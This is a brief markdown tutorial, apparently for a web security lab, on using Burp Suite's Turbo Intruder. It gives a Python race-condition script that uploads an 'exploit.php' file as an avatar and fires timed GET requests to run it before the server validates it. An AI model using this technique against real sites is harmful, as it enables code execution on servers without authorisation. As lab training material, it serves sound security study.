## Burp Suite Community Edition

### Turbo Introducer

**Usage**
  * Select Extensions > Turbo Intruder > Send to turbo intruder
  * Copy and paste the following script template into Turbo Intruder's Python editor:
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

      request1 = '''<YOUR-POST-REQUEST>'''

      request2 = '''<YOUR-GET-REQUEST>'''

      # the 'gate' argument blocks the final byte of each request until openGate is invoked
      engine.queue(request1, gate='race1')
      for x in range(5):
          engine.queue(request2, gate='race1')

      # wait until every 'race1' tagged request is ready
      # then send the final byte of each request
      # (this method is non-blocking, just like queue)
      engine.openGate('race1')

      engine.complete(timeout=60)


  def handleResponse(req, interesting):
      table.add(req)
  ```
  * In the script, replace `<YOUR-POST-REQUEST>` with the entire POST /my-account/avatar request containing your exploit.php file. You can copy and paste this from the top of the Turbo Intruder window. Same with `<YOUR-GET-REQUEST>`

  > **Note**
  > If you choose to build the GET request manually, make sure you terminate it properly with a `\r\n\r\n` sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent.

